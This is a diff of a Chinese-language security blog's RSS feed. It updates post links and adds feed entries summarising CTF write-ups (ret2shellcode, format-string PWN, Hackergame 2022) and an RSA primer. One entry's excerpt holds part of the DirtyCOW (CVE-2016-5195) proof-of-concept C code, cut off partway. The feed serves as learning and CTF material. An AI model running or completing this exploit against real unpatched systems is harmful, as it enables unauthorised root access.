@@ -9,10 +9,10 @@
     <lastBuildDate>Thu, 04 Apr 2024 00:00:00 +0000</lastBuildDate><atom:link href="https://asuka39.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>CVE-2016-5195 DirtyCOW</title>
-      <link>https://asuka39.github.io/posts/dirtycow/</link>
+      <link>https://asuka39.github.io/posts/2024-04-04-dirtycow/</link>
       <pubDate>Thu, 04 Apr 2024 00:00:00 +0000</pubDate>
       
-      <guid>https://asuka39.github.io/posts/dirtycow/</guid>
+      <guid>https://asuka39.github.io/posts/2024-04-04-dirtycow/</guid>
       
       <description>PoC 修改自dirtycow.github.io #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;sys/mman.h&amp;gt; #include &amp;lt;fcntl.h&amp;gt; #include &amp;lt;pthread.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/stat.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; void *map; int f; struct stat st; char *name; void *madviseThread(void *arg) { char *str; str = (char*)arg; int i, c = 0; for(i = 0; i &amp;lt; 100000000; i++) { c += madvise(map, 100, MADV_DONTNEED); } printf(&amp;#34;madvise %d\n\n&amp;#34;, c); } void *procselfmemThread(void *arg) { char *str; str = (char*)arg; int f = open(&amp;#34;/proc/self/mem&amp;#34;, O_RDWR); int i, c = 0; for(i = 0; i &amp;lt; 100000000; i++) { lseek(f, (uintptr_t)map, SEEK_SET); c += write(f, str, strlen(str)); } printf(&amp;#34;procselfmem %d\n\n&amp;#34;, c); } int main(int argc, char *argv[]) { if (argc &amp;lt; 3) { (void)fprintf(stderr, &amp;#34;%s\n&amp;#34;, &amp;#34;usage: dirtyc0w target_file new_content&amp;#34;); return 1; } pthread_t pth1, pth2; f = open(argv[1], O_RDONLY); fstat(f, &amp;amp;st); name = argv[1]; map = mmap(NULL, st.</description>
       
@@ -20,10 +20,10 @@
     
     <item>
       <title>LLVM Tutor Note</title>
-      <link>https://asuka39.github.io/posts/llvm-tutor/</link>
+      <link>https://asuka39.github.io/posts/2024-03-31-llvm-tutor/</link>
       <pubDate>Sun, 31 Mar 2024 00:00:00 +0000</pubDate>
       
-      <guid>https://asuka39.github.io/posts/llvm-tutor/</guid>
+      <guid>https://asuka39.github.io/posts/2024-03-31-llvm-tutor/</guid>
       
       <description>本人学习banach-space/llvm-tutor的一点笔记 Environment 首先安装 LLVM-17。Ubuntu 的包版本普遍滞后，22.04 到目前只有 LLVM-14，如果想使用更现代的 LLVM-17 就需要添加第三方源（其实是因为 LLVM project 的 API 更换太频繁到现在都没稳定下来）
 Ubuntu 22.04 wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add - sudo apt-add-repository &amp;#34;deb http://apt.llvm.org/jammy/ llvm-toolchain-jammy-17 main&amp;#34; sudo apt update sudo apt install -y llvm-17 llvm-17-dev llvm-17-tools clang-17 安装完就能在/usr/lib/llvm-17找到所需的头文件、库和二进制文件了
@@ -34,14 +34,102 @@ cd /path/to/llvm-tutor mkdir build &amp;amp;&amp;amp; cd build cmake -DLT_LLVM_I
     
     <item>
       <title>Linux 系统编程笔记</title>
-      <link>https://asuka39.github.io/posts/apue/</link>
+      <link>https://asuka39.github.io/posts/2023-12-03-apue/</link>
       <pubDate>Sun, 03 Dec 2023 00:00:00 +0000</pubDate>
       
-      <guid>https://asuka39.github.io/posts/apue/</guid>
+      <guid>https://asuka39.github.io/posts/2023-12-03-apue/</guid>
       
       <description>课程视频：Linux 系统编程 - 李慧琴老师 深入浅出，点面结合，恪守标准，爆赞 参考书目 UNIX 环境高级编程（第三版） Linux 内核设计与实现（第三版） 深入理解 Linux 内核（第三版） 参考文章 Linux系统编程学习笔记 | 来生拓己 オフィシャルサイト 标准 I/O 简介 I/O：input &amp;amp; output stdio：标准 I/O（优先使用，因为可移植性好且封装性好） sysio：系统 I/O（也叫文件 I/O） 常见标准 I/O：
 打开/关闭文件 输入输出流 文件指针操作 缓存相关 fopen fgetc，fputc fseek fflush fclose fgets，fputs ftell fread，fwrite rewind printf 族，scanf 族 FILE 类型始终贯穿标准 I/O
 fopen FILE *fopen(const char *path, const char *mode) path：文件路径 mode：访问权限 r：只读，文件指针定位到文件开头，要求文件必须存在 r+：可读写，文件指针定位到文件开头，要求文件必须存在 w：只写，有此文件则清空，无此文件则创建文件，文件指针定位到文件开头 w+：可读写，有此文件则清空，无此文件则创建文件，文件指针定位到文件开头 a：只写，追加到文件，无此文件则创建文件，文件指针定位到文件末尾（最后一个字节的下一个位置） a+：可读可追加（可写），无此文件则创建文件，读文件加时文件指针定位到文件开头，追加时文件指针定位到文件末尾 b：以二进制流打开，可以在以上权限后面加此权限（遵循 POSIX 的系统可以忽略，包括 Linux） 若执行成功函数返回一个 FILE 指针，失败则返回 NULL 并设置全局变量errno errno的定义在 /usr/include/asm-generic的宏中，若想使用需包含errno.</description>
+      
+    </item>
+    
+    <item>
+      <title>[Hackergame 2022] 个人writeup</title>
+      <link>https://asuka39.github.io/posts/2022-10-29-hackergame/</link>
+      <pubDate>Sat, 29 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://asuka39.github.io/posts/2022-10-29-hackergame/</guid>
+      
+      <description>writeup 签到 乱点一下，看看地址栏
+http://202.38.93.111:12022/?result=???? 显然get请求，改成result=2022就完了
+flag{HappyHacking2022-13de731b72} 猫咪问答 1. 中国科学技术大学 NEBULA 战队（USTC NEBULA）是于何时成立的喵？
+http://news.ustc.edu.cn/info/1047/28363.htm2017-03 2. 2022 年 9 月，中国科学技术大学学生 Linux 用户协会（LUG @ USTC）在科大校内承办了软件自由日活动。除了专注于自由撸猫的主会场之外，还有一些和技术相关的分会场（如闪电演讲 Lightning Talk）。其中在第一个闪电演讲主题里，主讲人于 slides 中展示了一张在 GNOME Wayland 下使用 Wayland 后端会出现显示问题的 KDE 程序截图，请问这个 KDE 程序的名字是什么？
+https://ftp.lug.ustc.edu.cn/%E6%B4%BB%E5%8A%A8/2022.9.20_%E8%BD%AF%E4%BB%B6%E8%87%AA%E7%94%B1%E6%97%A5/slides/gnome-wayland-user-perspective.pdfhttps://apps.kde.org/zh-cn/kdenlive/Kdenlive 3. 22 年坚持，小 C 仍然使用着一台他从小用到大的 Windows 2000 计算机。那么，在不变更系统配置和程序代码的前提下，Firefox 浏览器能在 Windows 2000 下运行的最后一个大版本号是多少？
+https://36kr.com/p/163969482752112 4. 你知道 PwnKit（CVE-2021-4034）喵？据可靠谣传，出题组的某位同学本来想出这样一道类似的题，但是发现 Linux 内核更新之后居然不再允许 argc 为 0 了喵！那么，请找出在 Linux 内核 master 分支（torvalds/linux.git）下，首个变动此行为的 commit 的 hash 吧喵！</description>
+      
+    </item>
+    
+    <item>
+      <title>[bamboofox] ret2shellcode [CTFwiki]</title>
+      <link>https://asuka39.github.io/posts/2022-10-19-ret2shellcode/</link>
+      <pubDate>Wed, 19 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://asuka39.github.io/posts/2022-10-19-ret2shellcode/</guid>
+      
+      <description>栈溢出 基本原理 栈溢出（Stack Overflow）指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，.bss段溢出等溢出方式
+关于C语言函数调用栈篇幅较长，可以参看大佬文章
+C 语言函数调用栈 (一) C 语言函数调用栈 (二) 以下是一个简单的程序栈模型
+在程序执行函数调用后，会将原函数的程序栈底地址ebp、返回地址retaddr压入栈中，使子程序执行完毕后重新跳转回原程序继续执行
+栈空间是从高地址向低地址增长的。但是，若函数中用到了数组作为局部变量时，向数组的赋值时的增长方向是从低地址到高地址的，与栈的增长方向相反。若对未限制数组的赋值边界，则可能对数组进行恶意的越界写入，便会把栈中的数据覆盖，造成栈溢出漏洞
+不难想到，攻击栈溢出漏洞的一般主要思路就是：填满变量栈空间并溢出覆盖返回地址，使子程序调用完毕后跳转至其他代码段（比如后台代码）
+需要注意的是，32 位和 64 位程序有以下简单的区别
+x86 函数参数在函数返回地址的上方 x64 System V AMD64 ABI（Linux、FreeBSD、macOS 等采用）中前六个整型或指针参数依次保存在RDI,RSI,RDX,RCX,R8和R9寄存器中，如果还有更多的参数的话才会保存在栈上 内存地址不能大于0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常 栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程
+此外，我们也不难发现，发生栈溢出的基本前提是
+程序必须向栈上写入数据 写入的数据大小没有被良好地控制 C和C++里常见的可以被利用的函数有
+输入 gets：直接读取一行，忽略\x00 scanf vscanf 输出 sprintf 字符串 strcpy：字符串复制，遇到\x00停止 strcat：字符串拼接，遇到\x00停止 bcopy ret2shellcode ret2shellcode即控制程序执行shellcode代码，是栈溢出漏洞的一种利用方法。shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell
+一般来说，shellcode需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码
+在栈溢出的基础上，要想执行shellcode，则需要对应的二进制程序在运行时shellcode所在的区域具有可执行权限
+题目 首先还是老套路checksec看看文件信息和保护情况，这里是一个几乎没开保护的32位ELF文件
+[*] &amp;#39;/mnt/c/Users/asuka/Desktop/CTF/wiki/pwn/ret2shellcode/ret2shellcode&amp;#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments 拖进32位IDA里反编译一下，发现get函数，感觉可以栈溢出</description>
+      
+    </item>
+    
+    <item>
+      <title>[第五空间2019 决赛] PWN5 [BUUCTF]</title>
+      <link>https://asuka39.github.io/posts/2022-10-19-pwn5/</link>
+      <pubDate>Wed, 19 Oct 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://asuka39.github.io/posts/2022-10-19-pwn5/</guid>
+      
+      <description>格式化字符串漏洞 先来简单讲讲什么是格式化字符串漏洞
+格式化字符串和格式化字符串函数 格式化字符串（Format String）是一些程序设计语言的输入/输出库中能将字符串参数转换为另一种形式输出的函数。
+格式化字符串函数则是一种可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数的函数。
+举个例子，C语言中的printf函数就是一种典型的格式化字符串函数，而标准printf函数写法中第一个参数（图中标红部分）就是格式化字符串
+在C和C++中常见的格式化字符串函数有
+输入 scanf：从stdin中读取 输出 printf：输出到stdout fprintf：输出到指定的FILE流 vprintf：根据参数列表格式化输出到stdout vfprintf：根据参数列表格式化输出到指定 FILE 流 sprintf：输出到字符串 snprintf：输出指定字节数到字符串 vsprintf：根据参数列表格式化输出到字符串 vsnprintf：根据参数列表格式化输出指定字节到字符串 setproctitle：设置 argv syslog：输出日志 err，verr，warn，vwarn等等 C和C++格式化字符串中格式化占位符（format placeholder）的语法如下：
+%[parameter][flags][field width][.precision][length]type 这里贴出维基百科里格式化字符串各占位符的详解
+格式化字符串漏洞原理 基本原理 依旧以printf函数为例
+进入printf函数之前程序的栈如下
+00:0000│ esp 0xffffce1c —▸ 0x80491b9 (main+67) ◂— add esp, 0x20 01:0004│ 0xffffce20 —▸ 0x804a00c ◂— &amp;#39;Color %s, Number %d, Float %4.2f&amp;#39; 02:0008│ 0xffffce24 —▸ 0x804a008 ◂— 0x646572 /* &amp;#39;red&amp;#39; */ 03:000c│ 0xffffce28 ◂— 0x1e240 04:0010│ 0xffffce2c ◂— 0x51eb851f 05:0014│ 0xffffce30 ◂— 0x40091eb8 06:0018│ 0xffffce34 —▸ 0xf7fbe66c —▸ 0xf7ffdba0 —▸ 0xf7fbe780 —▸ 0xf7ffda40 ◂— .</description>
+      
+    </item>
+    
+    <item>
+      <title>RSA加密算法（一）</title>
+      <link>https://asuka39.github.io/posts/2022-07-29-rsa/</link>
+      <pubDate>Fri, 29 Jul 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://asuka39.github.io/posts/2022-07-29-rsa/</guid>
+      
+      <description>本文大量使用$\LaTeX$公式，建议刷新一次使渲染更新后食用 前言 内行吹得天花乱坠、外行死活看不懂的深奥数论和其他近现代数学分支到底有什么用处？近现代数学取得的成果到底有何现实意义？数学家到底在思考什么、研究什么？这几个问题困扰了我这个数学废物很久很久。直到如今成为一名网安小白，接触了密码学之后，这个疑惑才终于散去几分。希望看了这篇关于 RSA 加密算法的介绍之后，你也能得到些许明悟。
+历史杂谈 1976 年以前，人类所有的加密算法都使用同一种模式
+发送方选择一种加密规则对信息进行加密 接收方使用同一种规则对信息进行解密 由于加密和解密使用同一种规则，因此这种加密算法称为“对称加密算法”。
+不难看出，对称加密算法最大的弱点在于，发送和接受双方必须事先约定加密规则，此时要想保密地传递和保存密钥变得十分困难。随着计算机技术的快速发展，这个问题变得更加严峻。最著名的例子就是二战时期纳粹德国的密码系统恩尼格玛被计算机科学之父艾伦·图灵设计的机器破解。
+1976 年，两位美国计算机学家 Whitfield Diffie 和 Martin Hellman，提出了一种崭新构思，可以在不直接传递密钥的情况下，完成解密。这被称为“Diffie-Hellman 密钥交换算法”。这个算法启发了其他科学家。人们认识到，加密和解密可以使用不同的规则，只要这两种规则之间存在某种对应关系即可，这样就避免了直接传递密钥。
+接收方生成公钥和私钥两把密钥，其中公钥是公开的，而私钥是保密的 发送方获取公开的公钥，使用它对信息进行加密 接收方使用保密的私钥对信息进行解密 公钥加密的信息只能通过私钥解得，只要私钥不泄露，通信就是安全的。
+这种加密算法称为“非对称加密算法”。
+1977 年，三位数学家 Rivest、Shamir 和 Adleman（封面图）设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字命名，叫做 RSA 算法。直到现在，RSA 算法依旧是最广为使用的非对称加密算法。毫不夸张地说，只要有计算机网络的地方，就有 RSA 算法。
+RSA算法非常可靠，密钥越长，它就越难破解。根据已经披露的文献，目前被破解的最长 RSA 密钥是 768 个二进制位。也就是说，长度超过 768 位的密钥，还无法破解（至少没人公开宣布）。因此可以认为，1024 位的 RSA 密钥基本安全，2048位的密钥极其安全。
+数学基础 互质 若两个正整数除了 1 以外没有其他公因子，则我们称这两个数是互质关系（coprime）。注意，构成互质关系的两个数不一定是质数。
+欧拉函数 先来引入一个问题：
+任意给定正整数n，则在小于等于n的正整数之中，有多少个与n构成互质关系？
+欧拉函数可以用来解决则个问题。
+约定用$\phi(n)$来表示欧拉函数。欧拉函数本身并不复杂，下面来一步步讨论。
+第一种情况 若 n=1，显然$\phi(1)=1。$
+第二种情况 若 n 是质数，则$\phi(n)=n-1$。因为质数与小于它的每个数都构成互质关系。
+第三种情况 若 n 是质数 p 的 k 次方，即$n=p^k$，则</description>
       
     </item>
     
